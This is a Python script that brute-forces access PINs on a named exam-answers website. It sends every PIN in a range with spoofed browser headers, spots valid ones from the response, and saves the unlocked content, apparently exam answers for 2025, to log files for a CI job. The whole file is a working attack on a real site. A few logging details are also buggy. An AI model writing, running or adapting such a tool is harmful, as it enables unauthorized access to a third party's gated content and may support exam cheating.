# pin_scanner.py (DEBUGGING VERSION)
import os
import re
import sys
import time

import requests

# --- CONFIGURATION ---
URL = "https://lite.ceebookanswers.net/epage.php"
HEADERS = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:139.0) Gecko/20100101 Firefox/139.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Content-Type": "application/x-www-form-urlencoded",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-User": "?1",
    "Priority": "u=0, i",
    "Pragma": "no-cache",
    "Cache-Control": "no-cache",
    "Referer": "https://lite.ceebookanswers.net/epage.php",
}

# --- BRUTEFORCE SETTINGS ---
START_PIN = 0
END_PIN = int(os.getenv("END_PIN", 1000))

# --- LOGGING & STATE ---
# Primary log for high-priority finds. This is now our STATE file.
LOG_FILE = "found_pins.log"
SILENT_LOG_FILE = "potential_pins.log"
# Temp file to pass extracted content to the CI step
CI_OUTPUT_FILE = "new_find_content.txt"

# --- SUCCESS/FAILURE CONDITIONS ---
FAILURE_INDICATOR_TEXT = "invalid pin"
SPECIAL_INDICATOR_TEXT = "2025"


# --- NEW: Function to load already found PINs ---
def get_already_found_pins() -> set:
    """
    Parses the main log file to find which PINs have already been successfully logged.
    Returns a set of PIN strings for efficient lookup.
    """
    if os.path.exists(CI_OUTPUT_FILE):
        os.remove(CI_OUTPUT_FILE)
        print(f"[*] Temporary file {CI_OUTPUT_FILE} exists.  after CI extraction.")

    found_pins = set()
    if not os.path.exists(LOG_FILE):
        return found_pins

    try:
        with open(LOG_FILE, "r") as f:
            content = f.read()
            # Use regex to find all logged PINs. Assumes format "PIN: 1234"
            # This is robust to other text in the log file.
            pins_in_log = re.findall(r"PIN:\s*(\d+)", content)
            found_pins.update(pins_in_log)
    except Exception as e:
        print(f"[!] Warning: Could not read or parse log file '{LOG_FILE}': {e}")

    return found_pins


# --- EXTRACTION LOGIC (remains the same) ---
def get_exam_summary(html_content: str) -> str:
    try:
        return extract_via_raw_text(html_content)
    except Exception as e:
        print(
            f"[!] BeautifulSoup parsing failed ({type(e).__name__}). Falling back to raw text processing."
        )
        return html_content


def extract_via_raw_text(html_content: str) -> str:
    lines = html_content.splitlines()
    content_lines, in_content_block = [], False
    for line in lines:
        if "SUBJECT:" in line and "itemContainer" in line:
            in_content_block = True
        if in_content_block:
            line_with_newlines = re.sub(r"<br\s*/?>", "\n", line, flags=re.IGNORECASE)
            no_html = re.sub(r"<.*?>", "", line_with_newlines)
            stripped = no_html.strip()
            if stripped:
                content_lines.append(stripped)
            if "=================================" in line:
                break
    return (
        "\n".join(content_lines)
        if content_lines
        else "Fallback failed: Could not extract content."
    )


# --- MAIN SCRIPT LOGIC (Updated for Debugging) ---
def scan_pins():
    """
    Scans the entire PIN range, skipping any PINs already in the log file.
    """
    # Load the set of PINs we already found in previous runs.
    already_found_pins = get_already_found_pins()
    if already_found_pins:
        print(f"[*] Loaded {len(already_found_pins)} previously found PINs to skip.")

    found_this_run_counter = 0

    with requests.Session() as session:
        print(f"[*] Starting full scan on {URL} from PIN {START_PIN} to {END_PIN}")

        for pin_number in range(START_PIN, END_PIN + 1):
            pin_to_test = str(pin_number)

            # --- CORE LOGIC CHANGE: Check if PIN should be skipped ---
            if pin_to_test in already_found_pins:
                print(
                    f"\r[*] Skipping PIN (already found): {pin_to_test}/{END_PIN} | New Finds this Run: {found_this_run_counter}"
                )
                # sys.stdout.flush()
                continue  # Skip to the next PIN

            print(
                f"\r[*] Trying PIN: {pin_to_test}/{END_PIN} | New Finds this Run: {found_this_run_counter}"
            )
            # sys.stdout.flush()

            try:
                response = session.post(
                    URL,
                    headers=HEADERS,
                    data={"pin": pin_to_test, "access": "Get Answers"},
                )
                response_text = response.text

                if SPECIAL_INDICATOR_TEXT in response_text:
                    found_this_run_counter += 1
                    print(
                        f"\n[!!!] NEW HIGH-PRIORITY FIND! PIN: {pin_to_test}. Extracting content..."
                    )
                    extracted_content = get_exam_summary(response_text)
                    full_content = f"PIN: {pin_to_test}\n\n{extracted_content}"

                    with open(LOG_FILE, "a") as f:
                        f.write(f"PIN: {pin_to_test}\n\n")

                    with open(CI_OUTPUT_FILE, "a") as f:
                        f.write(f"{full_content}\n\n---\n\n")

                    print(f"[*] PIN {pin_to_test} content extracted and logged.")

                elif FAILURE_INDICATOR_TEXT.lower() not in response_text.lower():
                    # This is a non-failure, non-special pin.
                    print(
                        f"\n[*] PIN {pin_to_test} is a potential find (not special, not invalid). Logging silently to {SILENT_LOG_FILE}."
                    )
                    # Optionally, print a snippet of response_text to debug why it's not special
                    # print(f"    Snippet: {response_text[:200]}...")
                    with open(LOG_FILE, "a") as f:
                        f.write(f"PIN: {pin_to_test}\n\n")
                else:
                    # This is an invalid pin.
                    # Uncomment the line below to see all invalid pins, but it can be very verbose
                    # print(f"\n[-] PIN {pin_to_test} is an invalid pin (contains '{FAILURE_INDICATOR_TEXT}').")
                    pass  # Keep the progress line updating

            except requests.exceptions.RequestException as e:
                print(f"\n[!] Network error: {e}. Waiting 10s...")
                time.sleep(10)

    print(
        f"\n[-] Full scan finished. Found {found_this_run_counter} new high-priority PIN(s) in this run."
    )
    with open(CI_OUTPUT_FILE, "r") as f:
        content = f.read()
        print(
            f"[*] Content extracted for CI: {len(content)} characters written to {CI_OUTPUT_FILE}"
        )


if __name__ == "__main__":
    # Clear the temp file from any previous run before starting
    # if os.path.exists(CI_OUTPUT_FILE):
    # os.remove(CI_OUTPUT_FILE)
    scan_pins()
